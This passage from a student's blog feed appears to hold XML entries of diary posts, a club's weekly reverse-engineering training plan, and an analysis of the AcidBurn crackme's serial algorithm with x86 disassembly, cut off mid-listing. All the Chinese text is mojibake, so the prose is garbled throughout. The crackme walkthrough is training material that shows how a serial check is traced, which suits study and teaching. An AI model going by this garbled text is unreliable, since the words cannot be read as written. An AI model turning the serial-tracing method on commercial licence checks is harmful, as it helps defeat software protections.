        <content type="html"><![CDATA[<p>ä»Šå¤©æœ‰å­¦é•¿æ‰¾æˆ‘ï¼Œè¯´æ˜¯æœ‰å¦ä¸€ä¸ªå­¦é•¿è¦æ‰¾æˆ‘èŠèŠï¼Œç»“æœæ˜¯æƒ³è®©æˆ‘å‚åŠ åä¸ºæ­å·ç ”ç©¶æ‰€çš„å®ä¹ â€¦â€¦æ²¡åŠæ³•åªèƒ½æ‹’ç»ï¼Œä¸€æ˜¯å‡†å¤‡è€ƒç ”ï¼Œæ— å¿ƒç«‹å³æ‰¾å·¥ä½œï¼ŒäºŒæ˜¯èƒ½åŠ›è¢«é«˜ä¼°äº†ï¼Œå­¦é•¿æ˜¯å¬è¯´æˆ‘åšpwnæ–¹å‘æ¥æ‰¾çš„æˆ‘ï¼Œè€Œæˆ‘è‡ªå·±æ¸…æ¥šåœ¨pwnä¸Šé¢æŠ•å…¥ä¸è¶³ï¼Œäº§å‡ºæ›´æ˜¯æ²¡æœ‰ã€‚æŒºé—æ†¾çš„ï¼Œå…¶å®æˆ‘æ˜¯æƒ³åœ¨æœ‰æ—¶é—´çš„æƒ…å†µä¸‹å‡ºå»å®ä¹ é”»ç‚¼é”»ç‚¼çš„ï¼Œå¯æƒœå¤§äºŒæ—¶å€™å­¦æ ¡ä¸ä¼šç»™è¿™ä¸ªæœºä¼šã€‚</p><p>å‰ä¸€é˜µç©pwnï¼Œçœ‹äº†å„ç§å †çš„åˆ©ç”¨ï¼Œåˆ°å¤´æ¥è‡ªå·±ä¸€é“é¢˜çš„è„šæœ¬éƒ½å†™ä¸å‡ºæ¥ã€‚é€†å‘åˆ†æä¸åˆ°ä½ï¼ŒROPä¸ä¼šæ„é€ ï¼ŒåŠ ä¸Špwnlibä¸ç†Ÿç»ƒï¼Œå¯¼è‡´æˆ‘æš‚æ—¶æ”¾å¼ƒäº†pwnï¼Œå¼€å§‹ä¸“æ³¨äºé€†å‘äº†ã€‚</p><p>ç¾¡æ…•å­¦æ ¡ä¿¡å®‰ä¸“ä¸š17çº§çš„kirin-sayå¸ˆå‚…ï¼Œå¾ˆæ—©å°±å¼€å§‹æé€†å‘äº†ï¼Œç°åœ¨åœ¨chamd5æ‰“pwnï¼Œåªå¸Œæœ›è‡ªå·±åœ¨å¤§ä¸‰ä¸Šç»“æŸä¹‹å‰å¯ä»¥æœ‰ä¸€å®šåŸºç¡€ï¼Œæœ€èµ·ç ä¸è¦å†åªèƒ½åšå‡ºæ¥æ¯”èµ›çš„ç­¾åˆ°é¢˜äº†â€¦â€¦å›½èµ›æ¡æ¼åšäº†ç¬¬ä¸€å¤©çš„é€†å‘ï¼ŒGOè¯­è¨€ä¸€è„¸æ‡µé€¼ï¼Œå…¨é å¤œå½±å¸ˆå‚…åšå®¢å¸¦ï¼ˆè™½ç„¶æœ€åæ²¡ç”¨ä¸Šåšå®¢é‡Œçš„çŸ¥è¯†â€¦â€¦ï¼‰ã€‚<br>UMLå¤§ä½œä¸šè¦ç”»åå‡ ä¸ªå›¾ï¼Œæ¯äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç”Ÿæ´» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¹±ä¸ƒå…«ç³Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬äº”ç©ºé—´é€†å‘ä»»åŠ¡</title>
      <link href="/2019/04/26/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E9%80%86%E5%90%91%E4%BB%BB%E5%8A%A1/"/>
      <url>/2019/04/26/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E9%80%86%E5%90%91%E4%BB%BB%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æœ¬ä»»åŠ¡æ‹Ÿå®šä»4æœˆ20æ—¥èµ·æ‰§è¡Œï¼Œä»»åŠ¡å‘¨æœŸä¸ºå‘¨æ—¥è‡³ä¸‹ä¸€å‘¨çš„å‘¨å…­ä¸Šåˆï¼Œä»»åŠ¡å®Œæˆè¿‡ç¨‹éœ€è¦æœ‰è¯¦ç»†çš„ç¬”è®°è®°è¿°ï¼Œä»»åŠ¡è€ƒå¯Ÿæ–¹å¼ä¸ºéªŒæ”¶ç¬”è®°å†…å®¹ã€‚ä»»åŠ¡å‘å¸ƒæ‹Ÿå®šäºæ¯å‘¨å‘¨å…­ä¸‹åˆæˆ–å‘¨æ—¥ä¸Šåˆã€‚æ¯æ¬¡ä»»åŠ¡å‘å¸ƒä¼šè¿å¸¦å‘å¸ƒä¸‹ä¸€å‘¨ä»»åŠ¡å†…å®¹ï¼Œæœ¬å‘¨æ—¶é—´è¶³å¤Ÿå¯ä»¥æå‰å‡†å¤‡ä¸‹å‘¨å†…å®¹ã€‚</p></blockquote><blockquote><p>æœ¬æ–‡æŒç»­æ›´æ–°ï¼Œåç»­ä»»åŠ¡äº¦å°†åœ¨æ­¤æ–‡ç« ä¸­æ›´æ–°ï¼Œå…³äºä»»åŠ¡å†…å®¹äº§ç”Ÿçš„ä»»ä½•é—®é¢˜ï¼Œå„ä½åŒå­¦è¯·åœ¨ä¿±ä¹éƒ¨ç¾¤è”ç³»æˆ‘ã€‚<br>ä¸Šäº¤çš„ç¬”è®°æ¨èä½¿ç”¨markdownè¿›è¡Œæ’ç‰ˆï¼Œå¯ä»¥ä¸Šäº¤.mdæ–‡ä»¶æˆ–.htmlæ–‡ä»¶ï¼Œ<strong><a href="https://www.appinn.com/markdown/" target="_blank" rel="noopener">ç»™ä¸ªmarkdownå­¦ä¹ çš„ä¼ é€é—¨</a></strong></p></blockquote><hr><h2 id="ç¬¬ä¸€å‘¨-4-21-4-27"><a href="#ç¬¬ä¸€å‘¨-4-21-4-27" class="headerlink" title="ç¬¬ä¸€å‘¨ 4/21 - 4/27"></a>ç¬¬ä¸€å‘¨ 4/21 - 4/27</h2><blockquote><p>æœ¬å‘¨ä»»åŠ¡ç›®çš„ä¸ºç†Ÿç»ƒæŒæ¡ç¼–ç¨‹è¯­è¨€ï¼Œæ¶‰åŠç»“æœå±•ç¤ºçš„å†…å®¹æˆªå›¾ä¿å­˜ï¼Œä»£ç ç›´æ¥å¤åˆ¶ç²˜è´´ã€‚</p><blockquote><p>1ã€2ã€3ã€4ä¸ºå¿…åšå†…å®¹ï¼Œå…¶ä½™ä¸ºé¢å¤–é€‰åšå†…å®¹ã€‚</p></blockquote></blockquote><ol><li>å­¦ä¹ å¹¶æŒæ¡Cè¯­è¨€åŸºç¡€å†…å®¹ï¼ŒåŒ…æ‹¬ï¼šå˜é‡ç±»å‹ã€è¿ç®—ç¬¦ã€æ¡ä»¶è¯­å¥ã€å¾ªç¯è¯­å¥ã€æ•°ç»„ã€å‡½æ•°ã€æŒ‡é’ˆç­‰åŠŸèƒ½ï¼Œäº†è§£Cè¯­è¨€ä¸­äºŒè¿›åˆ¶ã€å…«è¿›åˆ¶ã€åå…­è¿›åˆ¶æ•°çš„è¡¨ç¤ºä¸è¿ç®—ï¼ŒæŒæ¡ä½ä¸ã€ä½æˆ–ã€ä½å¼‚æˆ–ã€ä½å–åæ“ä½œã€‚å­¦ä¹ å¼‚æˆ–åŠ å¯†ä¸è§£å¯†æ–¹å¼ã€‚</li><li>å­¦ä¹ Cè¯­è¨€ä»æºä»£ç åˆ°äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆ*.exeæ–‡ä»¶ï¼‰çš„å¤„ç†è¿‡ç¨‹ï¼Œä¸è¦æ±‚æŒæ¡å…¶æŠ€æœ¯å®ç°ï¼Œé‡åœ¨çŸ¥æ™“æµç¨‹ã€‚</li><li>ä½¿ç”¨Cå®ç°ä¸€ä¸ªå‡½æ•°ï¼Œè¯¥å‡½æ•°æ¥æ”¶ä¸€ä¸ªæ•°ç»„æŒ‡é’ˆä½œä¸ºå‚æ•°ï¼Œå¹¶åˆ©ç”¨æŒ‡é’ˆéå†æ‰“å°æ•°ç»„å…ƒç´ çš„åœ°å€ä»¥åŠæ•°ç»„å…ƒç´ çš„å€¼ã€‚å‡½æ•°å®ç°åï¼Œåœ¨mainå‡½æ•°ä¸­æä¾›æ ·ä¾‹è¿›è¡Œå‡½æ•°åŠŸèƒ½å±•ç¤ºã€‚</li><li>ä½¿ç”¨ä»»æ„ç¼–ç¨‹è¯­è¨€å®ç°å¼‚æˆ–åŠ å¯†ï¼Œç”¨æˆ·è¾“å…¥ä¸€ä¸²æ•°æ®ï¼Œä»¥åŠä¸€ä¸²å¯†é’¥ï¼Œç¨‹åºå°†æ•°æ®ä¸å¯†é’¥è¿›è¡Œå¼‚æˆ–è¿ç®—åŠ å¯†ä¸ºå¯†æ–‡å¹¶æ‰“å°ã€‚</li><li>æ­å»ºLinuxè™šæ‹Ÿæœºï¼ˆæ¨èä½¿ç”¨Ubuntuç³»ç»Ÿï¼Œ14ã€16ã€18ç‰ˆæœ¬å‡å¯ï¼‰ï¼Œå­¦ä¹ LinuxåŸºæœ¬æ“ä½œï¼Œåœ¨Linuxç¯å¢ƒä¸‹ä½¿ç”¨gccç¼–è¯‘è¦æ±‚3ä¸­å®ç°çš„å†…å®¹å¹¶è¿è¡Œã€‚</li><li>å­¦ä¹ Pythonè¯­è¨€åŸºç¡€å†…å®¹ï¼Œè¦æ±‚åŒ1ï¼Œpythonæ— æŒ‡é’ˆï¼Œæ•…ä¸éœ€æŒæ¡ï¼ŒPythonçš„é¢å‘å¯¹è±¡ç¼–ç¨‹éƒ¨åˆ†ä¹Ÿä¸éœ€è¦æŒæ¡ã€‚</li></ol><p>å‚è€ƒï¼š</p><ol><li><a href="https://www.ubuntu.com/download/desktop" target="_blank" rel="noopener">Ubuntu 18.04.2é•œåƒä¸‹è½½</a></li><li><a href="https://my.vmware.com/cn/web/vmware/info/slug/desktop_end_user_computing/vmware_workstation_pro/15_0" target="_blank" rel="noopener">VMwareè™šæ‹Ÿæœºç¨‹åºä¸‹è½½</a></li><li><a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000" target="_blank" rel="noopener">PythonåŸºç¡€æ•™ç¨‹</a></li></ol><hr><h2 id="ç¬¬äºŒå‘¨-4-28-5-4"><a href="#ç¬¬äºŒå‘¨-4-28-5-4" class="headerlink" title="ç¬¬äºŒå‘¨ 4/28 - 5/4"></a>ç¬¬äºŒå‘¨ 4/28 - 5/4</h2><blockquote><p>ä»»åŠ¡ç›®çš„ä¸ºäº†è§£æ±‡ç¼–è¯­è¨€ï¼Œéš¾åº¦è¾ƒå¤§ï¼Œæ•…åˆ†ä¸¤å‘¨å®Œæˆã€‚</p><blockquote><p>1ã€2ã€3ä¸ºå¿…åšå†…å®¹ã€‚</p></blockquote></blockquote><ol><li>æŒæ¡æœºå™¨è¯­è¨€ã€æ±‡ç¼–è¯­è¨€ã€é«˜çº§è¯­è¨€ï¼ˆå¦‚Cè¯­è¨€ï¼‰çš„å…³ç³»ï¼Œäº†è§£CPUã€å¯„å­˜å™¨ã€å†…å­˜ä¹‹é—´çš„å…³ç³»ï¼Œå¯¹è®¡ç®—æœºæ‰§è¡Œç¨‹åºçš„è¿‡ç¨‹æœ‰ä¸€ä¸ªæ¦‚æ‹¬çš„è®¤è¯†ã€‚</li><li>æŒæ¡8086CPUä¸­å„ä¸ªå¯„å­˜å™¨çš„ä½œç”¨ï¼ŒæŒæ¡æ±‡ç¼–è¯­è¨€ä¸­è®¿é—®å˜é‡çš„æ–¹å¼ï¼ˆå¯»å€æ–¹å¼ï¼‰ã€‚</li><li>æŒæ¡ç¨‹åºä¸­çš„æ•°æ®æ®µã€ä»£ç æ®µã€æ ˆæ®µå„è‡ªçš„ä½œç”¨ã€‚</li></ol><p>å‚è€ƒæ•™æï¼š</p><ul><li><a href="ã€Šæ±‡ç¼–è¯­è¨€ç¬¬3ç‰ˆã€‹ç‹çˆ½è‘—.pdf" target="_blank">æ±‡ç¼–æ•™æä¸‹è½½ï¼ˆå¯ä»¥å»å¤§æœçš„ä¹¦åº—æ‰¾æ‰¾ï¼Œå¯èƒ½ä¼šæœ‰äºŒæ‰‹ï¼‰</a></li><li><a href="æ±‡ç¼–é‡‘æ‰‹æŒ‡.zip" target="_blank">æ±‡ç¼–é‡‘æ‰‹æŒ‡â€“æ±‡ç¼–æŒ‡ä»¤æŸ¥è¯¢</a><hr></li></ul><h2 id="ç¬¬ä¸‰å‘¨-5-5-5-11"><a href="#ç¬¬ä¸‰å‘¨-5-5-5-11" class="headerlink" title="ç¬¬ä¸‰å‘¨ 5/5 - 5/11"></a>ç¬¬ä¸‰å‘¨ 5/5 - 5/11</h2><blockquote><p>æœ¬å‘¨ç»§ç»­è¿›è¡Œæ±‡ç¼–è¯­è¨€çš„å­¦ä¹ ã€‚</p><blockquote><p>1ã€2ã€3ä¸ºå¿…åšï¼Œ4é€‰åšã€‚</p></blockquote></blockquote><ol><li>æŒæ¡æ±‡ç¼–çš„æµç¨‹æ§åˆ¶ï¼Œå¾ªç¯ã€‚</li><li>æŒæ¡æ ‡å¿—å¯„å­˜å™¨ã€callã€retæŒ‡ä»¤ã€‚</li><li>é‡ç‚¹æŒæ¡å‡½æ•°è°ƒç”¨æ ˆã€‚</li><li>å®‰è£…windows xp sp3è™šæ‹Ÿæœºï¼Œåœ¨xpç¯å¢ƒä¸‹è¿›è¡Œæ±‡ç¼–è¯­è¨€æ•™æä¸­çš„å®éªŒã€‚</li></ol><h2 id="ç¬¬å››å‘¨-5-12-5-18"><a href="#ç¬¬å››å‘¨-5-12-5-18" class="headerlink" title="ç¬¬å››å‘¨ 5/12 - 5/18"></a>ç¬¬å››å‘¨ 5/12 - 5/18</h2><blockquote><p>æœ¬å‘¨å¼€å§‹å­¦ä¹ åˆ†æå’Œè°ƒè¯•ã€‚</p><blockquote><p>1ã€2ã€3ä¸ºå¿…åšï¼Œ4é€‰åšã€‚</p></blockquote></blockquote><ol><li>å­¦ä¹ ä½¿ç”¨Ollydbgæˆ–x64dbgå¯¹ç¨‹åºè¿›è¡ŒåŠ¨æ€è°ƒè¯•åˆ†æã€‚</li><li>å­¦ä¹ ä½¿ç”¨IDA proå¯¹ç¨‹åºè¿›è¡Œé™æ€åˆ†æã€‚</li><li>åˆ†æä¸€ä¸ªç®€å•çš„ç¨‹åºï¼Œä¸‹è½½ä¼ é€é—¨<a href="a.exe" title="å¯ä»¥ç®—æ˜¯ä¸€é“ctfé¢˜å§(å¤§æ¦‚)">åœ¨è¿™é‡Œ</a>ï¼Œåˆ†ææ­¤ç¨‹åºï¼ˆä¸è®ºé™æ€æˆ–åŠ¨æ€ï¼Œåˆ†æå‡ºæ¥å³å¯ï¼Œå¿…é¡»æ˜¯åæ±‡ç¼–åˆ†æï¼Œä¸èƒ½æ˜¯åç¼–è¯‘åˆ†æï¼‰ï¼Œåˆ†æå‡ºç¨‹åºä¸­çš„å‡ ä¸ªå‡½æ•°ä»¥åŠå‡½æ•°åŠŸèƒ½ï¼Œåœ¨ç¬”è®°ä¸­è®°æ¸…æ¥šåˆ†æå†…å®¹ï¼Œæ‰¾å‡ºç¨‹åºä¸­çš„flagã€‚</li><li>ä¿®æ”¹3ä¸­ç¨‹åºï¼Œä½¿å…¶ä¸ä¼šæ‰“å°å‡ºâ€Try to kill me!â€ï¼Œå¹¶ä¸”ä¸å½±å“ç¨‹åºå…¶ä»–éƒ¨åˆ†ï¼Œåœ¨ç¬”è®°ä¸­è¯´æ˜ä½ patchçš„éƒ¨åˆ†ï¼Œä¸å¿…ä¸Šäº¤patchåçš„ç¨‹åºã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> è¯´ä¸ªæ­£äº‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¬¬äº”ç©ºé—´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190425</title>
      <link href="/2019/04/26/20190425/"/>
      <url>/2019/04/26/20190425/</url>
      
        <content type="html"><![CDATA[<p>æ˜¨å¤©çœ‹æƒæ¸¸å¿˜è®°å†™ï¼Œä»Šå¤©è¡¥ä¸Šã€‚</p><p>çœ‹äº†å¯†ç å­¦ä¹¦çš„ç¬¬ä¸€ç« ï¼Œå­¦ä¹ äº†å‡¯æ’’å¯†ç å’Œä»¿å°„åŠ å¯†ï¼Œè¯»ä¹¦ç¬”è®°è¿˜æ²¡æœ‰å†™ï¼Œç­‰ç€ä¹‹åè¡¥ä¸Šã€‚</p><p>è¿˜çœ‹äº†è‡ªæˆ‘ä¿®å…»å‰ä¸¤ç« ï¼Œè™½ç„¶ç¬¬ä¸€ç« å±äºåŸºç¡€çŸ¥è¯†çš„éƒ¨åˆ†ï¼Œä½†æ˜¯çœ‹äº†ç¬¬ä¸€ç« å±…ç„¶æŠŠè¿™å­¦æœŸæ“ä½œç³»ç»Ÿæ²¡å¤ªå­¦æ˜ç™½çš„å†…å®¹çœ‹æ˜ç™½äº†2333ï¼Œç¡®å®æ˜¯ä¸€æœ¬å¥½ä¹¦ã€‚</p><p>æ•´ç†ä¸€ä¸‹æ¬ è´¦ï¼Œä»¥åŠéœ€è¦é•¿æœŸè¿›è¡Œçš„äº‹é¡¹ï¼š</p><ul><li>ç¬¬äº”ç©ºé—´ä»»åŠ¡å‘å¸ƒåŠéªŒæ”¶æ‰“åˆ†</li><li>éŸ©è¯­</li><li>å“¨ç¬›</li><li>ä¸ƒæœˆå‰æŠŠè‡ªæˆ‘ä¿®å…»åˆ·ä¸€é</li><li>ä¹°ä¸€æœ¬CSAPPï¼Œæš‘æœŸå®ä¹ å‰åˆ·ä¸€é</li><li>æŠŠç¬¬äº”ç©ºé—´çš„ä»»åŠ¡å‘å¸ƒæ”¹åˆ°åšå®¢ä¸Šï¼ˆå¼•æµ233</li><li>æ“ä½œç³»ç»Ÿå®éªŒâ€¦</li><li>ä¸€å‘¨ä¸‰é“å·¦å³ï¼ˆæœ€å°‘ä¸€é“ï¼‰é€†å‘é¢˜ï¼Œåšé¢˜é‡å®åœ¨å¤ªå°‘äº†</li><li>æ•´ç†å‡ºæ›´å¤šçš„æ¬ è´¦â€¦â€¦</li></ul>]]></content>
      
      
      <categories>
          
          <category> ç”Ÿæ´» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¹±ä¸ƒå…«ç³Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190424</title>
      <link href="/2019/04/24/20190424/"/>
      <url>/2019/04/24/20190424/</url>
      
        <content type="html"><![CDATA[<p>å¬äº†ä¸ªè€ƒç ”è®²åº§ï¼Œæœ¬æ¥ä»¥ä¸ºä¹ç‚¹å›æ¥è¿˜èƒ½å­¦ç‚¹ä¸œè¥¿ï¼Œç»“æœè®²äº†ä¸¤å°æ—¶é€äº†ä¸€å°æ—¶ï¼Œå­¦ä¹ è®¡åˆ’å–æ¶ˆâ€¦â€¦</p><p>ä»Šå¤©æ–°å¼€äº†è¿ç­¹å­¦çš„è¯¾ï¼Œè¿™ä¸ªè¯¾ä¸»è¦æ˜¯è®²ä¸€äº›è§„åˆ’çš„ç®—æ³•ï¼Œä»¥åŠæ•°å­¦æ¨¡å‹çš„å»ºæ¨¡æ–¹é¢çš„çŸ¥è¯†ï¼Œæ„Ÿè§‰å¬å¬å¾ˆæœ‰å¥½å¤„ã€‚</p><p>ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ã€é¾™ä¹¦ã€æ·±å…¥æµ…å‡ºå¯†ç å­¦åˆ°è´§ï¼Œçœ‹äº†è‡ªæˆ‘ä¿®å…»çš„å‰ä¸¤ç« ï¼Œå‘¨æœ«æœ‰æ—¶é—´è®°ä¸€ä¸‹ç¬”è®°~</p><p>è®²åº§ä¸Šè¯´æœ¬éƒ¨çš„å¤è¯•è€ƒCSAPPï¼Œçœ‹æ¥è¿˜æ˜¯è¦å‰æ‰‹ä¹°CSAPPäº†ï¼Œè™½ç„¶æ‰‹ä¸Šæœ‰ä¸€æœ¬è‹±æ–‡ç‰ˆï¼Œä½†æ˜¯æ ¹æœ¬æ²¡æ—¶é—´ç¿»è¯‘å•Šâ€¦â€¦è‹±è¯­é˜…è¯»èµ·æ¥æ¯”ä¸­æ–‡æ…¢å¤ªå¤šäº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç”Ÿæ´» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¹±ä¸ƒå…«ç³Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AcidBurnåˆ†æ</title>
      <link href="/2019/04/23/AcidBurn%E5%88%86%E6%9E%90/"/>
      <url>/2019/04/23/AcidBurn%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><a href="AcidBurn.exe"><strong>ç¨‹åºä¸‹è½½</strong></a></p><p>AcidBurnçš„çˆ†ç ´ã€æŸ¥æ‰¾keyçš„è§£æ³•å°±ä¸å†è®°å½•äº†ï¼Œååˆ†åŸºç¡€ã€‚è¿™ç¯‡ä¸»è¦è®°å½•ç¨‹åºçš„æ³¨å†Œç®—æ³•ï¼Œå³ä¸‹å›¾æ‰€ç¤ºçª—å£ã€‚</p><p><img src="/2019/04/23/AcidBurnåˆ†æ/1.png" alt="1.png"></p><p>å¼€å§‹æ ¹æ®é”™è¯¯æç¤ºä¿¡æ¯ï¼ˆå¦‚ä¸‹å›¾ï¼‰æœç´¢å­—ç¬¦ä¸²ï¼ŒåæŸ¥å­—ç¬¦ä¸²è°ƒç”¨ã€‚</p><p><img src="/2019/04/23/AcidBurnåˆ†æ/2.png" alt="2.png"></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0042FA3B | 8B <span class="number">45</span> EC                 | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">14</span>]           |</span><br><span class="line">0042FA3E | 0F B6 <span class="number">40</span> <span class="number">02</span>              | <span class="keyword">movzx</span> <span class="built_in">eax</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">2</span>]           |</span><br><span class="line">0042FA42 | 6B C0 0E                 | <span class="keyword">imul</span> <span class="built_in">eax</span>,<span class="built_in">eax</span>,E                          |</span><br><span class="line">0042FA45 | <span class="number">03</span> F0                    | <span class="keyword">add</span> <span class="built_in">esi</span>,<span class="built_in">eax</span>                             |</span><br><span class="line">0042FA47 | <span class="number">89</span> <span class="number">35</span> <span class="number">58</span> <span class="number">17</span> <span class="number">43</span> <span class="number">00</span>        | <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">431758</span>],<span class="built_in">esi</span>           |</span><br><span class="line">0042FA4D | A1 6C <span class="number">17</span> <span class="number">43</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[43176C]           |</span><br><span class="line">0042FA52 | E8 D9 6E FD FF           | <span class="keyword">call</span> å»é™¤å¼¹çª—.<span class="number">406930</span>                        |</span><br><span class="line">0042FA57 | <span class="number">83</span> F8 <span class="number">04</span>                 | <span class="keyword">cmp</span> <span class="built_in">eax</span>,<span class="number">4</span>                               |</span><br><span class="line">0042FA5A | <span class="number">7D</span> <span class="number">1D</span>                    | <span class="keyword">jge</span> å»é™¤å¼¹çª—.42FA79                         |</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°42fa57å¤„å°†eaxçš„å€¼ä¸4è¿›è¡Œäº†æ¯”è¾ƒï¼Œå‘ä¸Šæ‰¾ï¼Œ<code>call 406930</code>ä¹‹åeaxçš„å€¼å˜æˆäº†6ï¼ˆè¾“å…¥ä¸º123456ï¼‰ï¼ŒçŒœæµ‹406930ä¼šè®¡ç®—å‡ºè¾“å…¥çš„nameå­—ç¬¦ä¸²é•¿åº¦ï¼Œæ”¹å˜nameä¸º123456789ï¼Œè°ƒè¯•å‘ç°å†æ¬¡æ‰§è¡Œåˆ°42fa57æ—¶ï¼Œeaxå˜æˆäº†9ï¼ŒåŸºæœ¬è¯å®äº†å…³äº406930çš„åŠŸèƒ½çŒœæƒ³ã€‚å†å›æ¥çœ‹<code>cmp eax,4</code>ï¼Œå’Œä¸‹ä¸€è¡Œçš„jgeï¼Œè”ç³»jgeè·³åˆ°çš„éƒ¨åˆ†çš„å†…å®¹ï¼Œå¾—å‡ºè¿™é‡Œå’Œ4æ¯”è¾ƒçš„åŸå› æ˜¯æ£€æŸ¥nameçš„é•¿åº¦æ˜¯å¦å°äºå››ï¼Œå°äºå››å°±ä¸å†è®¡ç®—åºåˆ—å·ï¼Œç›´æ¥æç¤ºé”™è¯¯ã€‚</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0042FA5C | 6A <span class="number">00</span>                    | <span class="keyword">push</span> <span class="number">0</span>                                  |</span><br><span class="line">0042FA5E | B9 <span class="number">74</span> FB <span class="number">42</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">ecx</span>,å»é™¤å¼¹çª—.42FB74                     | 42FB74:<span class="string">"Try Again!"</span></span><br><span class="line">0042FA63 | BA <span class="number">80</span> FB <span class="number">42</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">edx</span>,å»é™¤å¼¹çª—.42FB80                     | <span class="built_in">edx</span>:<span class="string">"|è«¦"</span>, 42FB80:<span class="string">"Sorry , The serial is incorect !"</span></span><br><span class="line">0042FA68 | A1 <span class="number">48</span> 0A <span class="number">43</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[430A48]           |</span><br><span class="line">0042FA6D | 8B <span class="number">00</span>                    | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>]              |</span><br><span class="line">0042FA6F | E8 FC A6 FF FF           | <span class="keyword">call</span> å»é™¤å¼¹çª—.42A170                        |</span><br><span class="line">0042FA74 | E9 BE <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           | <span class="keyword">jmp</span> å»é™¤å¼¹çª—.42FB37                         |</span><br><span class="line">0042FA79 | <span class="number">8D</span> <span class="number">55</span> F0                 | <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">10</span>]           | [<span class="built_in">ebp</span>-<span class="number">10</span>]:<span class="string">"123456789"</span></span><br><span class="line">0042FA7C | 8B <span class="number">83</span> DC <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>        | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>+1DC]          | [<span class="built_in">ebx</span>+1DC]:<span class="string">"\\ç™‡"</span></span><br><span class="line">0042FA82 | E8 D1 AF FE FF           | <span class="keyword">call</span> å»é™¤å¼¹çª—.41AA58                        |</span><br><span class="line">0042FA87 | 8B <span class="number">45</span> F0                 | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">10</span>]           | [<span class="built_in">ebp</span>-<span class="number">10</span>]:<span class="string">"123456789"</span></span><br><span class="line">0042FA8A | 0F B6 <span class="number">00</span>                 | <span class="keyword">movzx</span> <span class="built_in">eax</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>]             |</span><br><span class="line">0042FA8D | F7 <span class="number">2D</span> <span class="number">50</span> <span class="number">17</span> <span class="number">43</span> <span class="number">00</span>        | <span class="keyword">imul</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">431750</span>]              | <span class="number">00431750</span>:L<span class="string">")"</span></span><br><span class="line">0042FA93 | A3 <span class="number">50</span> <span class="number">17</span> <span class="number">43</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">431750</span>],<span class="built_in">eax</span>           | <span class="number">00431750</span>:L<span class="string">")"</span></span><br><span class="line">0042FA98 | A1 <span class="number">50</span> <span class="number">17</span> <span class="number">43</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">431750</span>]           | <span class="number">00431750</span>:L<span class="string">")"</span></span><br><span class="line">0042FA9D | <span class="number">01</span> <span class="number">05</span> <span class="number">50</span> <span class="number">17</span> <span class="number">43</span> <span class="number">00</span>        | <span class="keyword">add</span> <span 